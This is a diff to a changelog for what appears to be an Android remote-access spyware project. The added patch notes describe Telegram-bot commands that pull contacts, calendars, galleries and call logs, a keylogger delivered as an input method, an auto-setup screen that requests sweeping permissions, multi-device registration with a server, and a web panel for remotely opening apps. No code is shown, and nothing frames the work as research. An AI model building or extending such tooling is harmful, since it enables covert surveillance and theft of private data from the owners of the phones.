@@ -191,6 +191,29 @@ Platform: Sketchware Pro (daydream v7), package `mata.pro`, files in `.sketchwar
 - **Server.js** — already supports all view routes (hub, cam, screen, files, sms, applist, contactlist, callhist, gallery, control)
 - **Git pushed** to github.com/ZeronModz/zeronremote.git (forced push due to divergent branches)
 
+### V7.0 Patch 2 (2026-08-24) — Permissions + Multi-device + Web Updates
+- **AutoSetupActivity.java** — added missing permissions: READ_CALENDAR, WRITE_CALENDAR, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE
+- **TelegramRemoteService.java** fixes:
+  - Removed duplicate command handlers (/contacts, /calendar, /gallery, /calllog were overridden by Data Extraction section)
+  - `/calendar` — added `requirePerm(READ_CALENDAR)` check
+  - `/gallery` — added `requirePerm(READ_EXTERNAL_STORAGE)` check
+  - `/contacts` — rewritten with HTML formatting + inline web app button (sendWithButtons)
+  - `/keylogger` — checks if KeyLoggerIME is actually active keyboard via Settings.Secure.DEFAULT_INPUT_METHOD
+- **Multi-device support**:
+  - `sendWelcomeWithDevices()` — sends welcome image + device list with selection buttons
+  - `sendPhotoUrl()` — sends photo by URL with caption
+  - `sendPhotoWithButtons()` — sends photo with inline keyboard
+  - `editMessage()` — edits existing message (for dynamic updates)
+  - Device registration on service startup (push device info to server)
+  - Callback handlers: do:select_device_*, do:show_help, do:webpanel
+- **Random images** — 5 image URLs for dynamic design
+- **Web Dashboard updates**:
+  - `contactlist.html` — added copy button for phone numbers
+  - `applist.html` — added "Open" button for each app (sends /openapp command)
+  - `server.js` — multi-device support: devices map, /api/devices endpoint, /api/select endpoint, device registration on poll
+- **Files**: `AutoSetupActivity.java`, `TelegramRemoteService.java`, `contactlist.html`, `applist.html`, `server.js`
+- **Compile**: clean (pre-existing okio only)
+
 ### V7.0 Patch (2026-08-24) — Telegram HTML Formatting + MainActivity + AutoSetup UI
 - **Telegram Bot HTML formatting** — `sendHtml()` method with `parse_mode=HTML`
   - Helper methods: `hBold`, `hItalic`, `hUnder`, `hStrike`, `hCode`, `hPre`, `hLink`, `hQuote`, `hSpoiler`, `hSep`, `hLine`
